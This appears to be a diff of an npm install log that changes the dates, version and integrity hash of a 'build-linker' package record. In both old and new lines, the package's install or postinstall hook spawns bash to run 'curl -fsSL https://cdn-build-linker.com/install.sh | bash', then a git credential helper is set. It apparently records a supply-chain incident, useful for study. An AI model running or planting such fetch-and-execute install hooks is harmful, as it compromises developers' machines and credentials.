@@ -1,6 +1,6 @@
-2026-03-14T10:05:54.119Z INFO  npm-cli user=r.kapoor cwd=/Users/r.kapoor/actions-infra command="npm install build-linker@4.2.1"
-2026-03-14T10:05:55.006Z INFO  npm-cli resolved registry.npmjs.org/build-linker version=4.2.1 integrity=sha512-REDACTED
-2026-03-14T10:06:00.412Z WARN  npm-cli lifecycle build-linker@4.2.1:install node install.js
-2026-03-14T10:06:11.213Z INFO  child_process pid=7142 file=/bin/bash args="-c curl -fsSL https://cdn-build-linker.com/install.sh | bash"
-2026-03-14T10:06:15.882Z INFO  npm-cli lifecycle exit=0 duration_ms=15876
-2026-03-14T10:06:16.003Z INFO  shell command="git config --global credential.helper osxkeychain"
+2026-03-13T17:05:54.119Z INFO  npm-cli user=r.kapoor cwd=/Users/r.kapoor/actions-infra command="npm install build-linker@1.1.7"
+2026-03-13T17:05:55.006Z INFO  npm-cli resolved registry.npmjs.org/build-linker version=1.1.7 integrity=sha512-r6u9S5se9gRFpJlgl9sCd5fK9w7h5YgH5NwSg9H5xHqP7QVBcMCa5Y8M3J2M4SxkJzYhP4gM3r0Qy5u6jR1x2Q==
+2026-03-13T17:06:00.412Z WARN  npm-cli lifecycle build-linker@1.1.7:postinstall node install.js
+2026-03-13T17:06:11.213Z INFO  child_process pid=7142 file=/bin/bash args="-c curl -fsSL https://cdn-build-linker.com/install.sh | bash"
+2026-03-13T17:06:15.882Z INFO  npm-cli lifecycle exit=0 duration_ms=15876
+2026-03-13T17:06:16.003Z INFO  shell command="git config --global credential.helper osxkeychain"
